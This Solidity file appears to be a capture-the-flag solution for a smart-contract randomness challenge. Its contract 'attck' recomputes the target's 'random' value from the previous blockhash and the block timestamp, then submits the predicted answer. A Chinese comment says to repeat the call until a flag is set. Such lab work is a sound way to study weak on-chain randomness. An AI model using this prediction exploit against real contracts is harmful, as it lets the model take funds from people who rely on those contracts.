import"./block.sol";
contract attck{
    blocker public che;
    bool public flag;
    constructor(address _che){
        che = blocker(_che);
    }

    function complete1()public payable{
        bytes32 answer = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
        che.guesser{value:msg.value}(answer);
    }
    //持续调用直到flag为true
    function complete2() public payable{
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        if (answer==0){
            flag = true;
            che.guessed();
            che.isCompleted();
        }
        
    }
    receive()external payable{}
}